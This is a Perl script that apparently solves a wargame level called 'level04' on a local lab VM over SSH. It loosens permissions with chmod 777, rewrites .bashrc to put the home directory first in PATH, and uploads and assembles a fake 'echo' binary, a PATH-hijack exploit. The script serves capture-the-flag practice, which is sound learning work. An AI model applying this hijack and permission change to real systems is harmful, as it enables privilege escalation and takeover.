#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level04";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$scp = "scp -q -P 4242 $user\@$ip:~/level04.pl .";
print $red, $scp, $reset, "\n";
system($scp);

$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
$input = "chmod 777 . && chmod 777 .bashrc && echo $path > .bashrc";
print $green, $input, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$input'");

$scp2 = "scp -q -P 4242 ./echo.s $user\@$ip:~";
print $red, $scp2, $reset, "\n";
system($scp2);

$tool = "as echo.s && ld a.out -o echo && ./echo";
print $green, $tool, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$tool'");

#file $file # basic informations
#ldd $file # dynamic libraries
#objdump -d $file # assembly code
#strings $file # raw strings
#cat /proc/self/maps # memory mappings
#strace ./$file # system calls & signals
#ltrace ./$file # library calls tracer
#readelf -a $file # ELF informations
#xxd $file # binary to hex dump (all infos)
#xxd -p $file # binary to raw hex dump
#xxd -r -p $file # reverse raw hex to binary
